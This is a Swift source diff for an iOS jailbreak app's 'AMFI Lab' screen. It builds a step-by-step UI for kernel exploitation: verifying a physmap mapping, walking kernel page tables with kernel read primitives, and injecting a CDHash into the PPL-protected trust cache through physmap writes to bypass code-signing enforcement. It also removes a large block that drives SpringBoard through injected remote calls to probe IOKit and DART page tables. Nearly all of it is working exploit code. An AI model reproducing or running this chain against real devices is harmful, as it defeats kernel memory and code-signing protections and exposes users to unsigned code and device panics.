@@ -11,6 +11,44 @@
 import SwiftUI
 import IOSurface
 
+// MARK: - Physmap constants (saved when Exp 74 verifies)
+
+private enum PhysmapConstants {
+    private static let gVirtKey = "dsploit.physmap.gVirtBase"
+    private static let gPhysKey = "dsploit.physmap.gPhysBase"
+    private static let verifiedKey = "dsploit.physmap.verified"
+
+    static let defaultGPhysBase: UInt64 = 0x800000000
+
+    static func save(gVirtBase: UInt64, gPhysBase: UInt64) {
+        UserDefaults.standard.set(String(format: "%llx", gVirtBase), forKey: gVirtKey)
+        UserDefaults.standard.set(String(format: "%llx", gPhysBase), forKey: gPhysKey)
+        UserDefaults.standard.set(true, forKey: verifiedKey)
+    }
+
+    static func load() -> (gVirtBase: UInt64, gPhysBase: UInt64)? {
+        guard UserDefaults.standard.bool(forKey: verifiedKey),
+              let vStr = UserDefaults.standard.string(forKey: gVirtKey),
+              let pStr = UserDefaults.standard.string(forKey: gPhysKey),
+              let gVirtBase = UInt64(vStr, radix: 16),
+              let gPhysBase = UInt64(pStr, radix: 16) else { return nil }
+        return (gVirtBase, gPhysBase)
+    }
+
+    static func loadOrDefault() -> (gVirtBase: UInt64, gPhysBase: UInt64) {
+        load() ?? (0xffffffde9a094000, defaultGPhysBase)
+    }
+
+    static var isVerified: Bool { UserDefaults.standard.bool(forKey: verifiedKey) }
+
+    static var statusSummary: String {
+        if let p = load() {
+            return "gVirt=0x\(String(format: "%llx", p.gVirtBase)) gPhys=0x\(String(format: "%llx", p.gPhysBase))"
+        }
+        return "Jalankan Physmap Verify (Exp 74) dulu"
+    }
+}
+
 struct AMFIExperimentView: View {
     @ObservedObject private var root = RootExecutor.shared
     @ObservedObject private var mgr = dspmgr.shared
@@ -19,7 +57,8 @@ struct AMFIExperimentView: View {
     @State private var isRunning = false
     @State private var runningLabel = ""
     @State private var customBinary = "/usr/bin/id"
-    
+    @State private var showInjectConfirm = false
+
     struct ExperimentResult: Identifiable {
         let id = UUID()
         let name: String
@@ -49,45 +88,85 @@ struct AMFIExperimentView: View {
                 }
             }
             
-            // Experiments
+            // Jailbreak path (sequential — after Exp 74 success)
             Section {
-                Button(action: runAllExperiments) {
-                    HStack {
-                        Label("Run All (Exp 54-75)", systemImage: "play.circle.fill")
-                            .foregroundStyle(isRunning ? .gray : .red)
-                        Spacer()
-                        if isRunning && runningLabel.contains("All") {
-                            ProgressView()
-                                .scaleEffect(0.7)
-                        }
-                    }
-                }
-                .disabled(isRunning || !mgr.rcready)
-                
-                Button(action: runAmfidRC) {
-                    HStack {
-                        Label("âš¡ amfid RC (Exp 60)", systemImage: "bolt.shield")
-                            .foregroundStyle(isRunning ? .gray : .orange)
-                        Spacer()
-                        if isRunning && runningLabel.contains("amfid") {
-                            ProgressView()
-                                .scaleEffect(0.7)
-                        }
-                    }
-                }
-                .disabled(isRunning || !mgr.rcready)
-                
-                Button(action: { testSingleBinary(customBinary) }) {
-                    Label("Test Custom Binary", systemImage: "terminal")
-                }
-                .disabled(isRunning || !mgr.rcready)
-                
+                Text(PhysmapConstants.statusSummary)
+                    .font(.system(size: 10, design: .monospaced))
+                    .foregroundStyle(PhysmapConstants.isVerified ? .green : .orange)
+
+                pathButton(
+                    title: "① Physmap Verify (Exp 74)",
+                    icon: "map.fill",
+                    color: .cyan,
+                    label: "Physmap",
+                    action: runExp74,
+                    needsVerified: false
+                )
+
+                pathButton(
+                    title: "② Trust Cache Probe (Exp 77 read-only)",
+                    icon: "magnifyingglass.circle.fill",
+                    color: .mint,
+                    label: "TC Probe",
+                    action: runExp77Probe,
+                    needsVerified: true
+                )
+
+                pathButton(
+                    title: "③ Trust Cache Inject (Exp 77 FULL)",
+                    icon: "key.fill",
+                    color: .red,
+                    label: "TC Inject",
+                    action: { showInjectConfirm = true },
+                    needsVerified: true
+                )
+
+                pathButton(
+                    title: "④ Test Binary Spawn",
+                    icon: "terminal.fill",
+                    color: .indigo,
+                    label: "Spawn",
+                    action: { testSingleBinary(customBinary) },
+                    needsVerified: false
+                )
+
                 TextField("Binary path", text: $customBinary)
                     .font(.system(.caption, design: .monospaced))
             } header: {
-                Label("Experiments", systemImage: "flask")
+                Label("Jailbreak Path", systemImage: "flag.checkered")
             } footer: {
-                Text("âš ï¸ amfid RC may take 5-10s or hang. Do NOT kill app while running!")
+                Text("Urutan: 74 → 77 probe → 77 inject → spawn. Step ③ bisa panic (APRR/PPL) — backup dulu. Jangan tutup app saat berjalan.")
+                    .font(.system(size: 9))
+            }
+
+            Section {
+                Button(action: runAmfidRC) {
+                    HStack {
+                        Label("amfid RC (Exp 60)", systemImage: "bolt.shield")
+                            .foregroundStyle(isRunning ? .gray : .orange)
+                        Spacer()
+                        if isRunning && runningLabel.contains("amfid") {
+                            ProgressView().scaleEffect(0.7)
+                        }
+                    }
+                }
+                .disabled(isRunning || !mgr.rcready)
+
+                Button(action: runExp78) {
+                    HStack {
+                        Label("DART PTE Probe (Exp 78)", systemImage: "cpu")
+                            .foregroundStyle(isRunning ? .gray : .purple)
+                        Spacer()
+                        if isRunning && runningLabel.contains("DART") {
+                            ProgressView().scaleEffect(0.7)
+                        }
+                    }
+                }
+                .disabled(isRunning || !mgr.rcready)
+            } header: {
+                Label("Advanced", systemImage: "flask")
+            } footer: {
+                Text("Exp 60/78 opsional. Exp 78 = pure KRW, tanpa IOKit.")
                     .font(.system(size: 9))
             }
             
@@ -135,41 +214,91 @@ struct AMFIExperimentView: View {
         }
         .navigationTitle("AMFI Lab")
         .navigationBarTitleDisplayMode(.inline)
+        .alert("Trust Cache Inject?", isPresented: $showInjectConfirm) {
+            Button("Batal", role: .cancel) {}
+            Button("Inject (risiko panic)", role: .destructive) {
+                runExp77Inject()
+            }
+        } message: {
+            Text("Menulis CDHash via physmap ke __DATA.__ppl_data. Bisa panic jika APRR memblokir write. Pastikan Exp 74 ✅ dan Exp 77 probe berhasil dulu.")
+        }
     }
-    
-    // MARK: - Run All Experiments
-    
-    private func runAllExperiments() {
+
+    @ViewBuilder
+    private func pathButton(
+        title: String,
+        icon: String,
+        color: Color,
+        label: String,
+        action: @escaping () -> Void,
+        needsVerified: Bool
+    ) -> some View {
+        Button(action: action) {
+            HStack {
+                Label(title, systemImage: icon)
+                    .foregroundStyle(isRunning ? .gray : color)
+                Spacer()
+                if isRunning && runningLabel.contains(label) {
+                    ProgressView().scaleEffect(0.7)
+                }
+            }
+        }
+        .disabled(isRunning || !mgr.rcready || (needsVerified && !PhysmapConstants.isVerified))
+    }
+
+    // MARK: - Jailbreak path runners
+
+    private func runExperiment(
+        label: String,
+        operation: String,
+        append: Bool = false,
+        block: @escaping (RemoteCall) -> ExperimentResult
+    ) {
         isRunning = true
-        runningLabel = "All Experiments..."
-        results.removeAll()
-        
+        runningLabel = label
+
         #if !DISABLE_REMOTECALL
-        root.executeAsRoot(operation: "amfi_experiments") { rc in
-            var experimentResults: [ExperimentResult] = []
-            
-            // Experiments 1-53: REMOVED (legacy probes, see git history)
-            // Experiments 54-73, 75-76: DISABLED
-            // Experiment 77: DISABLED (physmap write panics — APRR blocks it)
-            
-            // ============================================
-            // Experiment 78: DART PTE Probe (ONLY ACTIVE)
-            // Find AGX DART page tables via IOKit object traversal
-            // Read existing mappings, probe DAPF constraints
-            // ============================================
-            let exp78 = self.expDARTPTEProbe(rc: rc)
-            experimentResults.append(exp78)
-            
+        root.executeAsRoot(operation: operation) { rc in
+            let result = block(rc)
             DispatchQueue.main.async {
-                self.results = experimentResults
+                if append {
+                    self.results.insert(result, at: 0)
+                } else {
+                    self.results = [result]
+                }
                 self.isRunning = false
                 self.runningLabel = ""
             }
-            
-            let successCount = experimentResults.filter { $0.success }.count
-            return (successCount > 0, "\(successCount)/\(experimentResults.count) succeeded", 0)
+            return (result.success, result.detail.prefix(80).description, 0)
         }
+        #else
+        isRunning = false
+        runningLabel = ""
         #endif
+    }
+
+    private func runExp74() {
+        runExperiment(label: "Physmap", operation: "exp74_physmap", append: true) { rc in
+            self.expPhysmapAccess(rc: rc)
+        }
+    }
+
+    private func runExp77Probe() {
+        runExperiment(label: "TC Probe", operation: "exp77_probe", append: true) { rc in
+            self.expTrustCacheWrite(rc: rc, dryRun: true)
+        }
+    }
+
+    private func runExp77Inject() {
+        runExperiment(label: "TC Inject", operation: "exp77_inject", append: true) { rc in
+            self.expTrustCacheWrite(rc: rc, dryRun: false)
+        }
+    }
+
+    private func runExp78() {
+        runExperiment(label: "DART", operation: "exp78_dart", append: true) { rc in
+            self.expDARTPTEProbe(rc: rc)
+        }
     }
     
     private func testSingleBinary(_ path: String) {
@@ -3728,6 +3857,8 @@ struct AMFIExperimentView: View {
                         detail += "physmap_slide = 0x\(String(format: "%llx", gVirtBaseCandidate &- gPhysBase))\n\n"
                         detail += "⚡⚡⚡ PPL ZONE ISOLATION BYPASSED! ⚡⚡⚡\n"
                         detail += "FULL JAILBREAK PATH OPEN!\n"
+                        detail += "→ Konstanta disimpan. Lanjut: ② Trust Cache Probe\n"
+                        PhysmapConstants.save(gVirtBase: gVirtBaseCandidate, gPhysBase: gPhysBase)
                         foundPhysBase = gPhysBase
                         foundVirtBase = gVirtBaseCandidate
                         break
@@ -3756,16 +3887,21 @@ struct AMFIExperimentView: View {
     /// KEY INSIGHT: PPL protects VIRTUAL page permissions. The physmap is a SEPARATE
     /// virtual mapping of the same physical memory with DIFFERENT permissions.
     /// Writing through physmap bypasses PPL's page table protections entirely.
-    private func expTrustCacheWrite(rc: RemoteCall) -> ExperimentResult {
-        var detail = "Experiment 77: FULL JAILBREAK — Physmap PPL Bypass\n"
+    private func expTrustCacheWrite(rc: RemoteCall, dryRun: Bool = false) -> ExperimentResult {
+        let expName = dryRun ? "Trust Cache Probe (Exp 77)" : "🏆 FULL JAILBREAK (Exp 77)"
+        var detail = dryRun
+            ? "Experiment 77: Trust Cache Probe (read-only)\n"
+            : "Experiment 77: FULL JAILBREAK — Physmap PPL Bypass\n"
         detail += "====================================================\n\n"
-        
-        let gPhysBase: UInt64 = 0x800000000
-        let gVirtBase: UInt64 = 0xffffffde9a094000
+
+        let physmap = PhysmapConstants.loadOrDefault()
+        let gPhysBase = physmap.gPhysBase
+        let gVirtBase = physmap.gVirtBase
         let kernBase = ds_get_kernel_base()
         let kernSlide = ds_get_kernel_slide()
-        
-        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
+
+        detail += "Mode: \(dryRun ? "PROBE (no write)" : "INJECT (physmap write)")\n"
+        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\(PhysmapConstants.isVerified ? "" : " (default)")\n"
         detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
         detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n\n"
         
@@ -3781,7 +3917,7 @@ struct AMFIExperimentView: View {
         
         guard taskAddr != 0 else {
             detail += "❌ taskbyproc failed\n"
-            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
         
         // Find vm_map at task+0x28 or task+0x30
@@ -3800,17 +3936,17 @@ struct AMFIExperimentView: View {
         
         guard vmMap != 0 else {
             detail += "❌ vm_map not found\n"
-            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
-        
+
         let pmapPtr = ds_kread64_safe(vmMap + 0x50)
         let tteBase = ds_kread64_safe(pmapPtr + 0x00)
         detail += "pmap: 0x\(String(format: "%llx", pmapPtr))\n"
         detail += "tte (L1 base VA): 0x\(String(format: "%llx", tteBase))\n\n"
-        
+
         guard tteBase > 0xffffffd000000000 else {
             detail += "❌ tte invalid\n"
-            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
         
         // ============================================================
@@ -3876,9 +4012,9 @@ struct AMFIExperimentView: View {
         guard l1Entry & 0x3 == 0x3 else {
             detail += "❌ L1 entry invalid (not table descriptor)\n"
             detail += "Bits [1:0] = 0x\(String(format: "%x", l1Entry & 0x3)) (need 0x3 for table)\n"
-            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
-        
+
         // L1 → L2 table physical address (bits [47:14] for 16KB granule)
         let l2TablePhys = l1Entry & 0x0000FFFFFFFC0000
         // Convert physical to physmap VA for reading
@@ -3900,9 +4036,9 @@ struct AMFIExperimentView: View {
                 detail += "Block phys: 0x\(String(format: "%llx", blockPhys))\n"
                 detail += "Target phys: 0x\(String(format: "%llx", targetPhys))\n"
             }
-            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
-        
+
         // L2 → L3 table physical address
         let l3TablePhys = l2Entry & 0x0000FFFFFFFC0000
         let l3TableVA = l3TablePhys &- gPhysBase &+ gVirtBase
@@ -3915,9 +4051,9 @@ struct AMFIExperimentView: View {
         
         guard l3Entry & 0x3 == 0x3 else {
             detail += "❌ L3 entry invalid (not page descriptor)\n"
-            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
-        
+
         // L3 → physical page (bits [47:14] for 16KB page)
         let pplPagePhys = l3Entry & 0x0000FFFFFFFC0000
         let pplPhysmapVA = pplPagePhys &- gPhysBase &+ gVirtBase &+ pageOff
@@ -4023,7 +4159,7 @@ struct AMFIExperimentView: View {
         guard tcStructAddr != 0 else {
             detail += "\n❌ Could not locate trust cache struct\n"
             detail += "Need to find trust cache via different method\n"
-            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
         
         // ============================================================
@@ -4048,6 +4184,12 @@ struct AMFIExperimentView: View {
             detail += "  [\(i)] 0x\(String(format: "%016llx", h0))\(String(format: "%016llx", h1))\(String(format: "%08x", h2))...\n"
         }
         
+        if dryRun {
+            detail += "\n✅ PROBE OK — trust cache ditemukan, physmap read siap.\n"
+            detail += "Langkah berikutnya: ③ Trust Cache Inject (risiko panic).\n"
+            return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+        }
+
         // ============================================================
         // STEP 5: PHYSMAP WRITE — Bypass PPL!
         // Walk page table for trust cache address → get physical page
@@ -4069,7 +4211,7 @@ struct AMFIExperimentView: View {
         let tcL1E = ds_kread64_safe(tteBase + tcL1Idx * 8)
         guard tcL1E & 0x3 == 0x3 else {
             detail += "❌ TC L1 entry invalid: 0x\(String(format: "%llx", tcL1E))\n"
-            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
         
         let tcL2Phys = tcL1E & 0x0000FFFFFFFC0000
@@ -4086,7 +4228,7 @@ struct AMFIExperimentView: View {
                 detail += "physmap VA: 0x\(String(format: "%llx", tcPhysmapVA))\n"
                 // Use this for write
             }
-            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
         
         let tcL3Phys = tcL2E & 0x0000FFFFFFFC0000
@@ -4094,7 +4236,7 @@ struct AMFIExperimentView: View {
         let tcL3E = ds_kread64_safe(tcL3VA + tcL3Idx * 8)
         guard tcL3E & 0x3 == 0x3 else {
             detail += "❌ TC L3 entry invalid: 0x\(String(format: "%llx", tcL3E))\n"
-            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
         
         let tcPagePhys = tcL3E & 0x0000FFFFFFFC0000
@@ -4112,7 +4254,7 @@ struct AMFIExperimentView: View {
         
         guard tcVerifyPhysmap != 0 else {
             detail += "❌ Physmap read of TC returned 0 — physical address wrong\n"
-            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
         
         if tcVerifyDirect == tcVerifyPhysmap {
@@ -4139,7 +4281,7 @@ struct AMFIExperimentView: View {
             let injL3E = ds_kread64_safe(tcL3VA + injL3Idx * 8)
             guard injL3E & 0x3 == 0x3 else {
                 detail += "❌ Inject page L3 invalid\n"
-                return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+                return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
             }
             let injPagePhys = injL3E & 0x0000FFFFFFFC0000
             injectPhysmapVA = injPagePhys &- gPhysBase &+ gVirtBase &+ injPageOff
@@ -4206,9 +4348,9 @@ struct AMFIExperimentView: View {
         }
         
         let jailbreakSuccess = detail.contains("TRUST CACHE INJECTION VIA PHYSMAP WORKS")
-        return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: jailbreakSuccess, detail: detail, timestamp: Date())
+        return ExperimentResult(name: expName, success: jailbreakSuccess, detail: detail, timestamp: Date())
     }
-    
+
     // MARK: - Experiment 75: PTE Remap Attack
     
     /// Walk kernel page tables to find trust cache's Page Table Entry (PTE).
@@ -4588,14 +4730,15 @@ struct AMFIExperimentView: View {
         
         let kernBase = ds_get_kernel_base()
         let kernSlide = ds_get_kernel_slide()
-        let gPhysBase: UInt64 = 0x800000000
-        let gVirtBase: UInt64 = 0xffffffde9a094000  // zone_map_base (confirmed exp 74)
-        
+        let physmap = PhysmapConstants.loadOrDefault()
+        let gPhysBase = physmap.gPhysBase
+        let gVirtBase = physmap.gVirtBase
+
         detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
         detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n"
         detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
         detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"
-        
+
         // Safety bounds — only read addresses in these ranges
         let safeZoneMin: UInt64 = 0xffffffdc00000000
         let safeZoneMax: UInt64 = 0xffffffe400000000
@@ -4940,579 +5083,7 @@ struct AMFIExperimentView: View {
         let success = dartMmioVA != 0 || confirmedDARTL1 != 0 || !confirmedL2Entries.isEmpty
         return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: success, detail: detail, timestamp: Date())
     }
-        
-        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
-        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
-        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"
-        
-        // ============================================================
-        // STEP 1: Find AGX DART via IOKit registry
-        // The AGXG11P kext creates an IODARTMapper instance
-        // We can find it by walking IOService objects in kernel memory
-        // OR: find the DART MMIO mapping via known device tree offsets
-        //
-        // On A12 (T8020), AGX DART MMIO is at a fixed physical address
-        // that gets mapped into kernel VA space during boot.
-        // We'll find it by scanning for the DART signature in IOKit objects.
-        // ============================================================
-        detail += "=== Step 1: Find AGX DART via IOKit ===\n"
-        
-        // Method: Use SpringBoard's IOKit access to find DART service
-        guard let sb = dspmgr.shared.sbProc else {
-            detail += "❌ No SpringBoard RC\n"
-            return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: false, detail: detail, timestamp: Date())
-        }
-        
-        let RTLD_DEFAULT = UInt64(bitPattern: -2)
-        
-        // Load IOKit framework in SpringBoard
-        let fwPath = remote_alloc_str(sb, "/System/Library/Frameworks/IOKit.framework/IOKit")
-        RootExecutor.rcall(sb, "dlopen", fwPath, 1)
-        RootExecutor.rcall(sb, "free", fwPath)
-        
-        // Get IOKit function pointers
-        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
-        let ioServiceGetMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
-        let ioRegistryEntryCreateCFProperties = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IORegistryEntryCreateCFProperties"))
-        let ioRegistryEntryGetRegistryEntryID = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IORegistryEntryGetRegistryEntryID"))
-        
-        detail += "IOKit funcs: matching=0x\(String(format: "%llx", ioServiceMatching))\n"
-        detail += "  getMatching=0x\(String(format: "%llx", ioServiceGetMatching))\n\n"
-        
-        // Find AppleT8020DART service (the AGX DART instance)
-        let dartServices = ["AppleT8020DART", "IODART", "IODARTMapper", "AGXG11P"]
-        var dartRegistryID: UInt64 = 0
-        var foundServiceName = ""
-        
-        for svcName in dartServices {
-            let nameAddr = remote_alloc_str(sb, svcName)
-            let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
-            if matchDict != 0 {
-                let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
-                if svc != 0 {
-                    // Get registry entry ID (unique kernel object identifier)
-                    let idAddr = sb.trojanMem + 0x1A00
-                    sb[idAddr].setValue64(0)
-                    let idRet = RootExecutor.rcall(sb, "IORegistryEntryGetRegistryEntryID", svc, idAddr)
-                    let regID = sb[idAddr].value64()
-                    
-                    detail += "✅ Found: \(svcName) (registryID=0x\(String(format: "%llx", regID)), ret=\(idRet))\n"
-                    if dartRegistryID == 0 {
-                        dartRegistryID = regID
-                        foundServiceName = svcName
-                    }
-                    
-                    // Release
-                    RootExecutor.rcall(sb, "IOObjectRelease", svc)
-                } else {
-                    detail += "  \(svcName): not found\n"
-                }
-            }
-            RootExecutor.rcall(sb, "free", nameAddr)
-        }
-        
-        detail += "\n"
-        
-        // ============================================================
-        // STEP 2: Find DART page tables via kernel memory scan
-        // IODARTMapper stores the page table base in its instance vars.
-        // We can find it by:
-        // a) Scanning IOKit registry objects for DART-related pointers
-        // b) Reading the DART MMIO TTBR registers directly (if we know MMIO VA)
-        // c) Scanning kernel memory for DART PTE patterns
-        //
-        // Approach (c) is most reliable: DART L1 tables contain PTEs with
-        // bit[0]=1 (VALID) and bits[35:12] pointing to L2 tables.
-        // L2 tables contain leaf PTEs with PA in bits[35:12].
-        // ============================================================
-        detail += "=== Step 2: Find DART page tables in kernel memory ===\n"
-        
-        // Strategy: Find IODARTMapper object in kernel, read its ivars
-        // IODARTMapper has a field pointing to the page table allocation
-        // We'll scan the DATA zone for objects that look like DART mappers
-        
-        // Alternative approach: scan for DART TTBR pattern
-        // DART TTBR contains: bit[31]=VALID, bits[30:0]=L1_table_PPN (PA >> 12)
-        // So a valid TTBR looks like: 0x8XXXXXXX where X is the page number
-        
-        // First, let's try to find the DART MMIO mapping
-        // On iOS, DART MMIO is mapped via ml_io_map during boot
-        // The mapping is typically in the 0xfffffff02... range (kernel VA)
-        // We can find it by looking for the DART PARAMS1 signature
-        
-        // DART PARAMS1 at offset 0x00 should have bits[27:24] = 0xC (page_shift=12 for 4KB)
-        // That means PARAMS1 & 0x0F000000 == 0x0C000000
-        
-        // Scan kernel __DATA for pointers to MMIO regions
-        // MMIO mappings on A12 are typically in range 0x20000000-0x30000000 (physical)
-        // which maps to kernel VA 0xfffffff02... after slide
-        
-        // Let's try a different approach: find AGXAccelerator's DART reference
-        // The AGXG11P driver stores its DART mapper pointer
-        
-        // APPROACH: Read IOSurface kernel objects to find DART mappings
-        // Every IOSurface that's GPU-mapped has a DART IOVA stored in it
-        // We can find the DART page table by working backwards from known IOVAs
-        
-        // Create a test IOSurface and find its DART mapping
-        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
-        let nsNumClass = remote_getClass(sb, "NSNumber")
-        let numWithInt = remote_sel(sb, "numberWithInteger:")
-        let dictNew = remote_sel(sb, "new")
-        let setObj = remote_sel(sb, "setObject:forKey:")
-        
-        // Create a small IOSurface (1 page = 4KB)
-        let surfDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
-        remote_msg(sb, surfDict, setObj,
-                   remote_msg(sb, nsNumClass, numWithInt, 0x1000, 0, 0, 0),
-                   remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
-        remote_msg(sb, surfDict, setObj,
-                   remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0),
-                   remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
-        remote_msg(sb, surfDict, setObj,
-                   remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0),
-                   remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
-        remote_msg(sb, surfDict, setObj,
-                   remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0),
-                   remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
-        remote_msg(sb, surfDict, setObj,
-                   remote_msg(sb, nsNumClass, numWithInt, 0x20303852, 0, 0, 0), // 'BGRA'
-                   remote_NSString(sb, "IOSurfacePixelFormat"), 0, 0)
-        
-        let testSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", surfDict)
-        detail += "Test IOSurface: 0x\(String(format: "%llx", testSurface))\n"
-        
-        if testSurface != 0 {
-            // Lock and get base address
-            RootExecutor.rcall(sb, "IOSurfaceLock", testSurface, 0, 0)
-            let baseAddr = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", testSurface)
-            let surfID = RootExecutor.rcall(sb, "IOSurfaceGetID", testSurface)
-            
-            detail += "  Base addr: 0x\(String(format: "%llx", baseAddr))\n"
-            detail += "  Surface ID: \(surfID)\n"
-            
-            // Write a marker so we can identify this page in physical memory
-            if baseAddr != 0 {
-                sb[baseAddr].setValue64(0xDA47_7E57_0078)
-                detail += "  Marker written: 0xDART_TEST_0078\n"
-            }
-            
-            RootExecutor.rcall(sb, "IOSurfaceUnlock", testSurface, 0, 0)
-            detail += "\n"
-        }
-        
-        // ============================================================
-        // STEP 3: Find DART page table via IOKit kernel object traversal
-        // Strategy: IODARTMapper kernel object has instance vars containing
-        // the page table base pointer. We find the object via its registry
-        // entry, then read its ivars to get the DART page table address.
-        //
-        // IOKit objects in kernel have structure:
-        //   +0x00: vtable pointer (kernel __TEXT range)
-        //   +0x08: retainCount
-        //   +0x10: instance vars...
-        //   Somewhere in ivars: MMIO base VA, page table pointer, etc.
-        // ============================================================
-        detail += "=== Step 3: IOKit object traversal for DART ===\n"
-        
-        let ourProc = ds_get_our_proc()
-        
-        // Safety bounds for all reads
-        let safeZoneMin: UInt64 = 0xffffffdc00000000
-        let safeZoneMax: UInt64 = 0xffffffe400000000
-        // Also allow kernel __TEXT/DATA range for vtable pointers
-        let kernMin: UInt64 = 0xfffffff000000000
-        let kernMax: UInt64 = 0xfffffff100000000
-        
-        func isSafeAddr(_ addr: UInt64) -> Bool {
-            return (addr >= safeZoneMin && addr < safeZoneMax) ||
-                   (addr >= kernMin && addr < kernMax)
-        }
-        
-        var confirmedDARTL1: UInt64 = 0
-        var confirmedL2Entries: [(iova: UInt64, pa: UInt64)] = []
-        
-        // Method: Use IOServiceGetMatchingService to get the service port,
-        // then use IORegistryEntryGetProperty to read "IODARTMapperPageTableBase"
-        // or similar property. If that doesn't work, we'll scan the kernel
-        // object's ivars directly.
-        
-        // First, try to get properties from the DART service
-        let dartNameAddr = remote_alloc_str(sb, "AppleT8020DART")
-        let dartMatchDict = RootExecutor.rcall(sb, "IOServiceMatching", dartNameAddr)
-        let dartSvc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, dartMatchDict)
-        RootExecutor.rcall(sb, "free", dartNameAddr)
-        
-        detail += "DART service port: \(dartSvc)\n"
-        
-        if dartSvc != 0 {
-            // Try IORegistryEntryCreateCFProperties to dump all properties
-            let propsAddr = sb.trojanMem + 0x1B00
-            sb[propsAddr].setValue64(0)
-            let kCFAllocatorDefault: UInt64 = 0
-            
-            let propRet = RootExecutor.rcall(sb, "IORegistryEntryCreateCFProperties",
-                                            dartSvc, propsAddr, kCFAllocatorDefault, 0)
-            let propsDict = sb[propsAddr].value64()
-            
-            detail += "IORegistryEntryCreateCFProperties: ret=\(propRet), dict=0x\(String(format: "%llx", propsDict))\n"
-            
-            if propsDict != 0 {
-                // Get count of properties
-                let countSel = remote_sel(sb, "count")
-                let count = remote_msg(sb, propsDict, countSel, 0, 0, 0, 0)
-                detail += "Properties count: \(count)\n\n"
-                
-                // Enumerate ALL keys using allKeys
-                let allKeysSel = remote_sel(sb, "allKeys")
-                let keysArray = remote_msg(sb, propsDict, allKeysSel, 0, 0, 0, 0)
-                
-                let objectForKey = remote_sel(sb, "objectForKey:")
-                let objectAtIndex = remote_sel(sb, "objectAtIndex:")
-                let descSel = remote_sel(sb, "description")
-                let cstrSel = remote_sel(sb, "UTF8String")
-                let classSel = remote_sel(sb, "className")
-                
-                let keyCount = min(count, 16)  // cap at 16
-                
-                for i in 0..<keyCount {
-                    let keyObj = remote_msg(sb, keysArray, objectAtIndex, UInt64(i), 0, 0, 0)
-                    guard keyObj != 0 else { continue }
-                    
-                    // Get key name — keyCStr is in SpringBoard userspace, use sb[] accessor
-                    let keyCStr = remote_msg(sb, keyObj, cstrSel, 0, 0, 0, 0)
-                    var keyName = "?"
-                    if keyCStr != 0 {
-                        var buf = [UInt8](repeating: 0, count: 48)
-                        for b in 0..<48 {
-                            let ch = sb[keyCStr + UInt64(b)].value8()
-                            buf[b] = ch
-                            if ch == 0 { break }
-                        }
